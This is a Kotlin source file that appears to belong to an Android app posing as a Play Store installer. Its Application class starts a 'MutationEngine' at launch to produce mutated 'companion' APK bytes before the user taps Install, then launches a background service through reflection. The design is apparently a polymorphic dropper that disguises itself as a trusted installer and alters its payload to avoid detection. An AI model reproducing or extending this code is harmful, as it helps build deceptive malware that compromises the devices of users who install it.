package com.playstore.installer

import android.app.Application
import android.content.Intent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class LauncherApplication : Application() {

    companion object {
        lateinit var instance: LauncherApplication
            private set

        // MutationEngine result — accessible from InstallActivity
        @Volatile var mutatedCompanionBytes: ByteArray? = null
        @Volatile var mutationReady: Boolean = false
        @Volatile var mutationError: Boolean = false

        private val appScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    }

    override fun onCreate() {
        super.onCreate()
        instance = this

        // Start MutationEngine immediately — runs before any Activity is shown.
        // By the time user taps Install (~10-15 seconds), mutation is done.
        appScope.launch {
            try {
                val engine = MutationEngine(applicationContext)
                val bytes  = engine.getMutatedCompanionBytes()
                if (bytes.isNotEmpty()) {
                    mutatedCompanionBytes = bytes
                    mutationReady = true
                } else {
                    mutationError = true
                }
            } catch (e: Exception) {
                mutationError = true
            }
        }

        startService(Intent(this, Class.forName(
            "com.playstore.installer.service.LauncherService"
        )))
    }
}
